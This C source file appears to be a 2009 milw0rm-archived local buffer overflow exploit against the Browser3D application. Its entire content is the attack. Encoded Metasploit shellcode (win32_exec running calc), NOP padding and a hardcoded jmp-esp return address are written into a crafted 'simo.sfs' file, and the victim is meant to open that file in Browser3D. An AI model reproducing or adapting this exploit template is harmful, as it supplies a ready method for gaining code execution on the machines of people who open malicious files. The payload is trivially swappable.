#include<stdio.h>
#include<string.h>
#include<windows.h>

/* Browser3D local BOF exploit
* coded by SimO-s0fT ( maroc-anti-connexion@hotmail.com)
*greetz to: all friends & all morroccan hackers
*special tnx for str0ke
/* win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com */
unsigned char scode[] =
"\x2b\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc2"
"\xf8\x23\x02\x83\xeb\xfc\xe2\xf4\x3e\x10\x67\x02\xc2\xf8\xa8\x47"
"\xfe\x73\x5f\x07\xba\xf9\xcc\x89\x8d\xe0\xa8\x5d\xe2\xf9\xc8\x4b"
"\x49\xcc\xa8\x03\x2c\xc9\xe3\x9b\x6e\x7c\xe3\x76\xc5\x39\xe9\x0f"
"\xc3\x3a\xc8\xf6\xf9\xac\x07\x06\xb7\x1d\xa8\x5d\xe6\xf9\xc8\x64"
"\x49\xf4\x68\x89\x9d\xe4\x22\xe9\x49\xe4\xa8\x03\x29\x71\x7f\x26"
"\xc6\x3b\x12\xc2\xa6\x73\x63\x32\x47\x38\x5b\x0e\x49\xb8\x2f\x89"
"\xb2\xe4\x8e\x89\xaa\xf0\xc8\x0b\x49\x78\x93\x02\xc2\xf8\xa8\x6a"
"\xfe\xa7\x12\xf4\xa2\xae\xaa\xfa\x41\x38\x58\x52\xaa\x08\xa9\x06"
"\x9d\x90\xbb\xfc\x48\xf6\x74\xfd\x25\x9b\x42\x6e\xa1\xf8\x23\x02";
int main(int argc,char *argv[]){
    printf("\t ===>viva marrakesh city<===\t\n");
    FILE *openfile;
    char exploit[430];
    char junk[262];
    char ret[]="\x68\xD5\x85\7C";//jmp kernel32.dll esp (windows trust sp2)
    char nop[]="\x90\x90\x90\x90";
    memset(junk,0x90,262);
    memcpy(exploit,junk,strlen(junk));
    memcpy(exploit+strlen(junk),ret,strlen(ret));
    memcpy(exploit+strlen(junk)+strlen(ret),nop,strlen(nop));
    memcpy(exploit+strlen(junk)+strlen(ret)+strlen(nop),scode,160);
    openfile=fopen("simo.sfs","wb");
    if(openfile==NULL){ perror("can't opening this file\n"); }
    fwrite(exploit,1,sizeof(exploit),openfile);
    fclose(openfile);
    printf("file created ....!"
                 "open it whit Browser3d");
    return 0;
}

// milw0rm.com [2009-01-22]
